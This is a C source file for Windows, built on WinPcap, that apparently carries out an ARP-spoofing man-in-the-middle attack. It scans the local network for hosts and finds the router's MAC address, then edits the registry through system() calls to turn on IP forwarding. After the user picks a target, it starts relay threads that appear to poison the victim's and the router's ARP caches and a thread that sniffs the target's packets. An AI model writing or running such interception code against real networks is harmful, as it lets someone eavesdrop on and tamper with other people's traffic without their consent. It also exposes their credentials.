#pragma comment(lib, "ws2_32.lib")
#include<time.h>
#include<process.h>
#include"IPscan.h"

time_t startTime = 0, endTime = 0;

int count_time() {
	time(&endTime);
	return (int)difftime(endTime, startTime);
}

int main() {

	pcap_if_t *alldevs, *d;
	pcap_t *fp;
	struct pcap_pkthdr *header;
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	const u_char *pkt_data;
	u_char data[ARP_HEADER_LEN] = { 0, };
	int res, i, j = 0, number = 0, cnt = 0;
	char buf[32] = { 0, }, buf2[32] = { 0, }, errbuf[PCAP_ERRBUF_SIZE];
	u_int threadID[5];
	HANDLE scan, relay_vic_request, relay_vic_reply, relay_rou_request, relay_rou_reply, tar_sniffing;
	a_info *info;

	if (!InitializeCriticalSectionAndSpinCount(&crt, 0x00000400)) return 0;

	if (pcap_findalldevs(&alldevs, errbuf) == -1) { // My Adapter Search
		printf("Error pcap_finealldevs_ex : %s\n", errbuf);
		exit(1);
	}
	printf("-------------------------------------------------------Choose the your device-------------------------------------------------------\n");
	for (d = alldevs; d != NULL; d = d->next) {
		printf("\t%d. %s", ++j, d->name);
		if (d->description)
			printf(" (%s)", d->description);
		else
			printf(" (No description available)");
		printf("\n");
	}
	if (j == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	printf("------------------------------------------------------------------------------------------------------------------------------------\n");
	printf("\tSelect Number : ");
	scanf("%d", &number);
	if (number < 1 || number > j)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs, j = 0; j < number - 1; d = d->next, j++); // end

	search_Info(d->name); // My Ip, Mac and Router Ip Search

	if ((fp = pcap_open_live(d->name, 65536, 1, 20, errbuf)) == NULL) { // My adapter Open
		printf("pcap open failed\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	time(&startTime);
	info = getAdapterInfo();
	setpcapData_scan(fp, *info);

	scan = (HANDLE)_beginthreadex(NULL, 0, broadcast, 0, 0, &threadID[0]);
	relay_vic_request = (HANDLE)_beginthreadex(NULL, 0, sending_vic_request, 0, 0, &threadID[1]);
	relay_vic_reply = (HANDLE)_beginthreadex(NULL, 0, sending_vic_reply, 0, 0, &threadID[2]);
	relay_rou_request = (HANDLE)_beginthreadex(NULL, 0, sending_rou_request, 0, 0, &threadID[3]);
	relay_rou_reply = (HANDLE)_beginthreadex(NULL, 0, sending_rou_reply, 0, 0, &threadID[4]);

	if (scan == 0 || relay_vic_reply == 0 ||relay_rou_request == 0 || relay_rou_reply == 0) {
		printf("_beginthreadex() error");
		return -1;
	}

	while ((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) {
		if (res == 0) continue;
		if (header->len != header->caplen) {
			printf("pcap file error\n");
			exit(1);
		}

		if (count_time() > 30) {
			setBroadcastFlag(TRUE, 0);
			break;
		}
		eh = (struct libnet_ethernet_hdr *)pkt_data;

		if (ETHERTYPE_ARP == ntohs(eh->ether_type)) {
			if (!strncmp(data, "", ARP_HEADER_LEN)) {
				for (i = 0; i < ARP_HEADER_LEN; i++) *(data + i) = *(pkt_data + i);
				setBroadcastFlag(FALSE, data);
			}

			pkt_data = pkt_data + sizeof(*eh);

			ah = (struct libnet_arp_hdr *)pkt_data;

			if (!strcmp(inet_ntop(AF_INET, &info->Router_Ip, buf, sizeof(buf)), inet_ntop(AF_INET, &ah->ar_spa, buf2, sizeof(buf2)))) {
				if (!strncmp(info->Router_Mac, "", ETHER_ADDR_LEN)) {
					printf("\tRouter MAC : \t");
					for (i = 0; i < ETHER_ADDR_LEN; i++) {
						*(info->Router_Mac + i) = *(ah->ar_sha + i);
						if (i == 5) printf("%02X\n", *(info->Router_Mac + i));
						else printf("%02X-", *(info->Router_Mac + i));
					}
					printf("\n------------------------------------------------------------------------------------------------------------------------------------\n");
				}
			}
			if (ARPOP_REPLY == ntohs(ah->ar_op)) {
				if (broadcast_reply(ah)) {
					cnt++;
				}
			}
		}
	}
	
	WaitForSingleObject(scan, INFINITE);
	CloseHandle(scan);
	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /t REG_DWORD /v IPEnableRouter /d 1 /f");
	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess /t REG_DWORD /v Start /d 2 /f");
	if (cnt == 0) printf("Not Found Target\n");
	else {
		setpcapData_relay(fp, *info);

		while (1) {
			printf("\n------------------------------------------------------------------------------------------------------------------------------------\n");
			printf("Select Target IP Number (EXIT = 0): ");
			scanf("%d", &number);
			if (number < 0 || number > cnt) printf("Number is out of Range\n");
			else if (number == 0) {
				printf("BYE BYE~!\n");
				exit(1);
			}
			else break;
		}
		setSendingFlag(FALSE, data, number - 1);
	}

	tar_sniffing = (HANDLE)_beginthreadex(NULL, 0, target_paket_capture, d->name, 0, &threadID[5]);
	if (tar_sniffing == 0) {
		printf("_beginthreadex() error");
		return -1;
	}

	WaitForSingleObject(relay_vic_request, INFINITE);
	WaitForSingleObject(relay_vic_reply, INFINITE);
	WaitForSingleObject(relay_rou_request, INFINITE);
	WaitForSingleObject(relay_rou_reply, INFINITE);
	WaitForSingleObject(tar_sniffing, INFINITE);
	CloseHandle(relay_vic_request);
	CloseHandle(relay_vic_reply);
	CloseHandle(relay_rou_request);
	CloseHandle(relay_rou_reply);
	CloseHandle(tar_sniffing);

	pcap_freealldevs(alldevs);

	DeleteCriticalSection(&crt);
	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /t REG_DWORD /v IPEnableRouter /d 0 /f");
	system("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess /t REG_DWORD /v Start /d 4 /f");
	return 0;
}